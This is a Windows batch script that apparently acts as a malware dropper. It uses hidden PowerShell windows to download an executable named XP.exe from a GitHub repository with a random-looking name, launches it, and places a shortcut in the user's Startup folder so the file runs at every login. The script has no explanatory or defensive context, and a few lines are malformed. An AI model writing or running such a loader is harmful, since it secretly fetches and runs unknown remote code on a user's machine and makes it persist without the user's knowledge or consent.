@echo off

PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/XP.exe -OutFile '%USERPROFILE%\ms\XP.exe'"
timeout
/t 10/nobreak

start "" XP.exe

set SourceExe=%USERPROFILE%\ms\XP.exe
set DestinationPath=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SHORTCUT.lnk

powershell.exe -WindowStyle hidden -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DestinationPath%'); $Shortcut.TargetPath = '%SourceExe%'; $Shortcut.Save()"